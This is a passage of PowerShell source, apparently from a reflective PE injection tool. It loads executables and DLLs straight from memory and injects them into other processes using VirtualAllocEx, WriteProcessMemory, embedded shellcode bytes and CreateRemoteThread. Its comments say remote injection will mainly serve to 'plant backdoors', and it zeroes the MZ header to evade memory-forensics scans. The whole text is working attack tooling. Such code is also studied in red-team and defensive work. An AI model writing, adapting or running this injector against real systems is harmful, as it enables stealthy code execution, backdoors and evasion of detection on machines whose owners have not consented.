            #####################################
            ##########    FUNCTIONS   ###########
            #####################################
            Function Get-MemoryProcAddress {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [IntPtr]
                    $PEHandle,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [String]
                    $FunctionName
                )
    
                $Win32Types = Get-Win32Types
                $Win32Constants = Get-Win32Constants
                $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
    
                #Get the export table
                if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0) {
                    return [IntPtr]::Zero
                }
                $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
                $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
    
                for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++) {
                    #AddressOfNames is an array of pointers to strings of the names of the functions exported
                    $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                    $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
                    $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)
    
                    if ($Name -ceq $FunctionName) {
                        #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                        #    which contains the offset of the function in to the DLL
                        $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                        $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                        $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                        $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                        return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
                    }
                }
    
                return [IntPtr]::Zero
            }
    
    
            Function Invoke-MemoryLoadLibrary {
                Param(
                    [Parameter( Position = 0, Mandatory = $true )]
                    [Byte[]]
                    $PEBytes,
    
                    [Parameter(Position = 1, Mandatory = $false)]
                    [String]
                    $ExeArgs,
    
                    [Parameter(Position = 2, Mandatory = $false)]
                    [IntPtr]
                    $RemoteProcHandle,
    
                    [Parameter(Position = 3)]
                    [Bool]
                    $ForceASLR = $false
                )
    
                $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
    
                #Get Win32 constants and functions
                $Win32Constants = Get-Win32Constants
                $Win32Functions = Get-Win32Functions
                $Win32Types = Get-Win32Types
    
                $RemoteLoading = $false
                if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero)) {
                    $RemoteLoading = $true
                }
    
                #Get basic PE information
                Write-Verbose "Getting basic PE information from the file"
                $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
                $OriginalImageBase = $PEInfo.OriginalImageBase
                $NXCompatible = $true
                if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) {
                    Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
                    $NXCompatible = $false
                }
    
                #Verify that the PE and the current process are the same bits (32bit or 64bit)
                $Process64Bit = $true
                if ($RemoteLoading -eq $true) {
                    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
                    $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
                    if ($Result -eq [IntPtr]::Zero) {
                        Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
                    }
    
                    [Bool]$Wow64Process = $false
                    $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
                    if ($Success -eq $false) {
                        Throw "Call to IsWow64Process failed"
                    }
    
                    if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4))) {
                        $Process64Bit = $false
                    }
    
                    #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
                    $PowerShell64Bit = $true
                    if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
                        $PowerShell64Bit = $false
                    }
                    if ($PowerShell64Bit -ne $Process64Bit) {
                        throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
                    }
                }
                else {
                    if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
                        $Process64Bit = $false
                    }
                }
                if ($Process64Bit -ne $PEInfo.PE64Bit) {
                    Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
                }
    
                #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
                Write-Verbose "Allocating memory for the PE and write its headers to memory"
    
                #ASLR check
                [IntPtr]$LoadAddr = [IntPtr]::Zero
                $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
                if ((-not $ForceASLR) -and (-not $PESupportsASLR)) {
                    Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
                    [IntPtr]$LoadAddr = $OriginalImageBase
                }
                elseif ($ForceASLR -and (-not $PESupportsASLR)) {
                    Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
                }
    
                if ($ForceASLR -and $RemoteLoading) {
                    Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
                }
                if ($RemoteLoading -and (-not $PESupportsASLR)) {
                    Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
                }
    
                $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
                $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
                if ($RemoteLoading -eq $true) {
                    #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
                    $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
    
                    #todo, error handling needs to delete this memory if an error happens along the way
                    $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                    if ($EffectivePEHandle -eq [IntPtr]::Zero) {
                        Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
                    }
                }
                else {
                    if ($NXCompatible -eq $true) {
                        $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
                    }
                    else {
                        $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                    }
                    $EffectivePEHandle = $PEHandle
                }
    
                [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
                if ($PEHandle -eq [IntPtr]::Zero) {
                    Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
                }
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
    
    
                #Now that the PE is in memory, get more detailed information about it
                Write-Verbose "Getting detailed PE information from the headers loaded in memory"
                $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
                $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
                $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
                Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
    
    
                #Copy each section from the PE in to memory
                Write-Verbose "Copy PE sections in to memory"
                Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
    
    
                #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
                Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
                Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types
    
    
                #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
                Write-Verbose "Import DLL's needed by the PE we are loading"
                if ($RemoteLoading -eq $true) {
                    Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
                }
                else {
                    Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
                }
    
    
                #Update the memory protection flags for all the memory just allocated
                if ($RemoteLoading -eq $false) {
                    if ($NXCompatible -eq $true) {
                        Write-Verbose "Update memory protection flags"
                        Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
                    }
                    else {
                        Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
                    }
                }
                else {
                    Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
                }
    
    
                #If remote loading, copy the DLL in to remote process memory
                if ($RemoteLoading -eq $true) {
                    [UInt32]$NumBytesWritten = 0
                    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
                    if ($Success -eq $false) {
                        Throw "Unable to write shellcode to remote process memory."
                    }
                }
    
    
                #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
                if ($PEInfo.FileType -ieq "DLL") {
                    if ($RemoteLoading -eq $false) {
                        Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
    
                        $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
                    }
                    else {
                        $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
    
                        if ($PEInfo.PE64Bit -eq $true) {
                            #Shellcode: CallDllMain.asm
                            $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                            $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                            $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                        }
                        else {
                            #Shellcode: CallDllMain.asm
                            $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                            $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                            $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                        }
                        $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                        $SCPSMemOriginal = $SCPSMem
    
                        Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                        Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                        Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
    
                        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                        if ($RSCAddr -eq [IntPtr]::Zero) {
                            Throw "Unable to allocate memory in the remote process for shellcode"
                        }
    
                        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength)) {
                            Throw "Unable to write shellcode to remote process memory."
                        }
    
                        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                        if ($Result -ne 0) {
                            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                        }
    
                        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
                    }
                }
                elseif ($PEInfo.FileType -ieq "EXE") {
                    #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
                    [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
                    [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
                    $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr
    
                    #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
                    #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
                    [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                    Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."
    
                    $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
    
                    while ($true) {
                        [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                        if ($ThreadDone -eq 1) {
                            Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                            Write-Verbose "EXE thread has completed."
                            break
                        }
                        else {
                            Start-Sleep -Seconds 1
                        }
                    }
                }
    
                return @($PEInfo.PEHandle, $EffectivePEHandle)
            }
    
    
            Function Invoke-MemoryFreeLibrary {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [IntPtr]
                    $PEHandle
                )
    
                #Get Win32 constants and functions
                $Win32Constants = Get-Win32Constants
                $Win32Functions = Get-Win32Functions
                $Win32Types = Get-Win32Types
    
                $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
    
                #Call FreeLibrary for all the imports of the DLL
                if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0) {
                    [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
    
                    while ($true) {
                        $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
    
                        #If the structure is null, it signals that this is the end of the array
                        if ($ImportDescriptor.Characteristics -eq 0 `
                                -and $ImportDescriptor.FirstThunk -eq 0 `
                                -and $ImportDescriptor.ForwarderChain -eq 0 `
                                -and $ImportDescriptor.Name -eq 0 `
                                -and $ImportDescriptor.TimeDateStamp -eq 0) {
                            Write-Verbose "Done unloading the libraries needed by the PE"
                            break
                        }
    
                        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                        $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)
    
                        if ($ImportDllHandle -eq $null) {
                            Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                        }
    
                        $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                        if ($Success -eq $false) {
                            Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                        }
    
                        $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
                    }
                }
    
                #Call DllMain with process detach
                Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
    
                $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
    
    
                $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
                if ($Success -eq $false) {
                    Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
                }
            }
    
    
            Function Main {
                $Win32Functions = Get-Win32Functions
                $Win32Types = Get-Win32Types
                $Win32Constants = Get-Win32Constants
    
                $RemoteProcHandle = [IntPtr]::Zero
    
                #If a remote process to inject in to is specified, get a handle to it
                if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne "")) {
                    Throw "Can't supply a ProcId and ProcName, choose one or the other"
                }
                elseif ($ProcName -ne $null -and $ProcName -ne "") {
                    $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
                    if ($Processes.Count -eq 0) {
                        Throw "Can't find process $ProcName"
                    }
                    elseif ($Processes.Count -gt 1) {
                        $ProcInfo = Get-Process | Where-Object { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                        Write-Output $ProcInfo
                        Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
                    }
                    else {
                        $ProcId = $Processes[0].ID
                    }
                }
    
                #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
                #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
                #       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
                #       {
                #           Write-Verbose "Getting SeDebugPrivilege"
                #           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
                #       }
    
                if (($ProcId -ne $null) -and ($ProcId -ne 0)) {
                    $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
                    if ($RemoteProcHandle -eq [IntPtr]::Zero) {
                        Throw "Couldn't obtain the handle for process ID: $ProcId"
                    }
    
                    Write-Verbose "Got the handle for the remote process to inject in to"
                }
    
    
                #Load the PE reflectively
                Write-Verbose "Calling Invoke-MemoryLoadLibrary"
                $PEHandle = [IntPtr]::Zero
                if ($RemoteProcHandle -eq [IntPtr]::Zero) {
                    $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
                }
                else {
                    $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
                }
                if ($PELoadedInfo -eq [IntPtr]::Zero) {
                    Throw "Unable to load PE, handle returned is NULL"
                }
    
                $PEHandle = $PELoadedInfo[0]
                $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
    
    
                #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
                $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
                if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero)) {
                    #########################################
                    ### YOUR CODE GOES HERE
                    #########################################
                    switch ($FuncReturnType) {
                        'WString' {
                            Write-Verbose "Calling function with WString return type"
                            [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                            if ($WStringFuncAddr -eq [IntPtr]::Zero) {
                                Throw "Couldn't find function address."
                            }
                            $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                            $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                            [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                            $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                            Write-Output $Output
                        }
    
                        'String' {
                            Write-Verbose "Calling function with String return type"
                            [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                            if ($StringFuncAddr -eq [IntPtr]::Zero) {
                                Throw "Couldn't find function address."
                            }
                            $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                            $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                            [IntPtr]$OutputPtr = $StringFunc.Invoke()
                            $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                            Write-Output $Output
                        }
    
                        'Void' {
                            Write-Verbose "Calling function with Void return type"
                            [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                            if ($VoidFuncAddr -eq [IntPtr]::Zero) {
                                Throw "Couldn't find function address."
                            }
                            $VoidFuncDelegate = Get-DelegateType @() ([Void])
                            $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                            $VoidFunc.Invoke() | Out-Null
                        }
                        'None' {
                            Write-Verbose "Not calling any function. Leaving it all to DllMain(DLL_PROCESS_ATTACH)."
                        }
                    }
                    #########################################
                    ### END OF YOUR CODE
                    #########################################
                }
                #For remote DLL injection, call a void function which takes no parameters
                elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero)) {
                    $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero)) {
                        Throw "VoidFunc couldn't be found in the DLL"
                    }
    
                    $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
                    $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
    
                    #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
                    $Null = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
                }
    
                #Don't free a library if it is injected in a remote process or if it is an EXE.
                #Note that all DLL's loaded by the EXE will remain loaded in memory.
                if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL") {
                    Invoke-MemoryFreeLibrary -PEHandle $PEHandle
                }
                else {
                    #Delete the PE file from memory.
                    $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
                    if ($Success -eq $false) {
                        Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
                    }
                }
    
                Write-Verbose "Done!"
            }
    
            Main
        }
    
        #Main function to either run the script locally or remotely
        Function Main {
            if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent) {
                $DebugPreference = "Continue"
            }
    
            Write-Verbose "PowerShell ProcessID: $PID"
    
            #Verify the image is a valid PE file
            $e_magic = ($PEBytes[0..1] | ForEach-Object { [Char] $_ }) -join ''
    
            if ($e_magic -ne 'MZ') {
                throw 'PE is not a valid PE file.'
            }
    
            if (-not $DoNotZeroMZ) {
                # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
                # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
                $PEBytes[0] = 0
                $PEBytes[1] = 0
            }
    
            #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
            if ($ExeArgs -ne $null -and $ExeArgs -ne '') {
                $ExeArgs = "ReflectiveExe $ExeArgs"
            }
            else {
                $ExeArgs = "ReflectiveExe"
            }
    
            if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$") {
                Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName, $ForceASLR, $ExeArgs)
            }
            else {
                Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName, $ForceASLR, $ExeArgs) -ComputerName $ComputerName
            }
        }
    
        Main
    }

